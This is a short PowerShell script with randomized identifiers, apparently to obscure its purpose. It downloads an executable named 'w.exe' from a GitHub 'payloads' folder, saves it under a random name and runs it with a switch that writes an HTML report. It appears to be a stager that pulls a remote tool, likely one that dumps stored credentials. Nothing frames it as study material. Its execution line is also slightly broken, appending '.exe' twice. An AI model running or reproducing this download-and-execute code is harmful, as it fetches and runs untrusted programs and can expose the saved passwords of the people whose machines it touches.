function uCmLBUkWvE {

    return -join ((65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})

}

$TcDrgEHOCo = uCmLBUkWvE + '.exe'
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/AlexKollar/Cryptex/master/payloads/w.exe' -OutFile $TcDrgEHOCo

$zXMpyWDQjY = uCmLBUkWvE
./$TcDrgEHOCo'.exe' /shtml $zXMpyWDQjY'.html'
